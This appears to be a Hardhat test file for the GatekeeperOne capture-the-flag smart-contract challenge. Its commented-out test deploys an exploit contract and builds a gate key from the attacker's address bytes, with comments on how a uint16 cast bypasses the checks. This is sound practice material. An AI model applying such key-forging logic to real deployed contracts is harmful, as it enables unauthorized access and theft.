import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/src/signers'
import { ethers } from 'hardhat'
import chai from '../scripts/chaisetup'
import { ExploitGateKeeper } from '../types/typechain/ExploitGateKeeper'
import { GatekeeperOne } from '../types/typechain/GatekeeperOne'

describe('GatekeeperOne', () => {
  let target: GatekeeperOne
  let deployer: any, attacker: any

  // beforeEach(async () => {
  //   ;[deployer, attacker] = await ethers.getSigners()

  //   const targetFactory = await ethers.getContractFactory(
  //     'GatekeeperOne',
  //     deployer
  //   )

  //   target = (await targetFactory.deploy()) as GatekeeperOne
  // })

  // it('executes exploit', async () => {
  //   const exploitFactory = await ethers.getContractFactory(
  //     'ExploitGateKeeper',
  //     attacker
  //   )

  //   const exploit = (await exploitFactory.deploy(
  //     target.address
  //   )) as ExploitGateKeeper

  //   const txPart = (
  //     await (attacker as SignerWithAddress).getAddress()
  //   ).substring(38)

  //   // txPart is from 3rd require in gateThree, address is 20 bytes, uint16 is 2 bytes
  //   // -> conversion to lower uint16 cuts higher order data -> means last 2 bytes of addrr

  //   // '0x' + '1000' + '0000' should not be 0 as it would be the same as whole thing compared to 2nd part (require 2)
  //   // '0000' + txPart 2nd half should be same as last quarter (require 1)
  //   const gateKey = '0x' + '1000' + '0000' + '0000' + txPart

  //   await exploit.execute(gateKey)
  // })
})
